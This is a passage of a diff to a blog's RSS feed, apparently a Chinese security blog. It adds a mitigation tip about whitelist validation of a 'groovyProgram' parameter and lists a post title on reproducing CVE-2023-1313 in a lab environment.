+&lt;li&gt;​&lt;strong&gt;​输入过滤​&lt;/strong&gt;​：对&lt;code&gt;groovyProgram&lt;/code&gt;参数实施白名单校验，禁止异常字符。&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
         <title>【春秋云境】CVE-2023-1313复现</title>
         <link>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2023-1313%E5%A4%8D%E7%8E%B0/</link>
         <pubDate>Sun, 14 Sep 2025 00:00:00 +0000</pubDate>
